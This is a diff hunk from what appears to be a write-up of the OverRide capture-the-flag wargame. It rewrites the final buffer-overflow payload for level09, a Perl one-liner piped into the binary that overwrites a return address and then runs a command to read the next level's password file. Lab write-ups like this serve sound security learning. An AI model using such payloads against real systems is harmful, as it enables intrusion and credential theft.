@@ -115,7 +115,7 @@ We thought that the binary was compiled with PIE(position-independent executable
 
 ## Final step. Build payload
 ```
-level09@OverRide:~$ perl -e 'print "A"x40 . "\xff" . "\n" . "A"x200 . "\x8c\x48\x55\x55\x55\x55\x00\x00" . "\n" . "cat /home/users/end/.pass"' | ./level09
+level09@OverRide:~$ perl -e 'print "A"x40, "\xff\n", "A"x200, pack("Q<", 0x000055555555488c), "\ncat /home/users/end/.pass"' | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
